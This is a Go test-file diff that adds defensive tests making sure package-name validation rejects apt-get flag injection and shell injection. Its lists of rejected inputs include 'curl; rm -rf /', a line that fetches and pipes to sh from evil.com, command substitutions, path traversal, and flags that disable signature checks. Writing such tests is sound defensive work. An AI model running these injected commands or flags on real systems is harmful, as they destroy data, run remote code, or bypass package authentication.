@@ -1,6 +1,7 @@
 package packages
 
 import (
+	"context"
 	"strings"
 	"testing"
 )
@@ -258,6 +259,83 @@ func TestBuildInstallDepsArgs_Empty(t *testing.T) {
 		return // guard matched — test passes
 	}
 	t.Error("guard did not match empty slice")
+}
+
+// ---------------------------------------------------------------------------
+// SEC-PKG-01: Package name validation — flag injection prevention
+// ---------------------------------------------------------------------------
+
+// TestValidatePkgName_AcceptsValid verifies that well-formed Debian package names
+// pass the allowlist regexp.
+func TestValidatePkgName_AcceptsValid(t *testing.T) {
+	valid := []string{
+		"curl",
+		"vim",
+		"libssl3",
+		"python3-pip",
+		"apt-transport-https",
+		"lib32gcc-s1",
+		"linux-image-6.1.0-21-amd64",
+	}
+	for _, name := range valid {
+		if err := validatePkgName(name); err != nil {
+			t.Errorf("validatePkgName(%q) returned unexpected error: %v", name, err)
+		}
+	}
+}
+
+// TestValidatePkgName_RejectsFlagInjection verifies that names starting with '-'
+// (which would be interpreted as apt-get flags) are rejected.
+func TestValidatePkgName_RejectsFlagInjection(t *testing.T) {
+	dangerous := []string{
+		"--allow-unauthenticated",
+		"--force-yes",
+		"-y",
+		"-o APT::Get::Assume-Yes=true",
+	}
+	for _, name := range dangerous {
+		if err := validatePkgName(name); err == nil {
+			t.Errorf("validatePkgName(%q) should return error (flag injection)", name)
+		}
+	}
+}
+
+// TestValidatePkgName_RejectsShellMetachars verifies that metacharacters used
+// in shell command injection attempts are rejected.
+func TestValidatePkgName_RejectsShellMetachars(t *testing.T) {
+	dangerous := []string{
+		"curl; rm -rf /",
+		"curl && wget http://evil.com/malware | sh",
+		"$(evil_command)",
+		"`evil`",
+		"curl\nwget evil",
+		"../../../etc/evil.deb",
+	}
+	for _, name := range dangerous {
+		if err := validatePkgName(name); err == nil {
+			t.Errorf("validatePkgName(%q) should return error (shell metachar)", name)
+		}
+	}
+}
+
+// TestInstall_ValidatesName ensures Install rejects dangerous package names
+// without invoking apt-get.
+func TestInstall_ValidatesName(t *testing.T) {
+	ctx := context.Background()
+	if err := Install(ctx, "--allow-unauthenticated"); err == nil {
+		t.Error("Install should reject --allow-unauthenticated (flag injection)")
+	}
+	if err := Install(ctx, "curl; rm -rf /"); err == nil {
+		t.Error("Install should reject 'curl; rm -rf /' (shell injection)")
+	}
+}
+
+// TestRemove_ValidatesName ensures Remove rejects dangerous package names.
+func TestRemove_ValidatesName(t *testing.T) {
+	ctx := context.Background()
+	if err := Remove(ctx, "--force-yes"); err == nil {
+		t.Error("Remove should reject --force-yes (flag injection)")
+	}
 }
 
 // ---------------------------------------------------------------------------
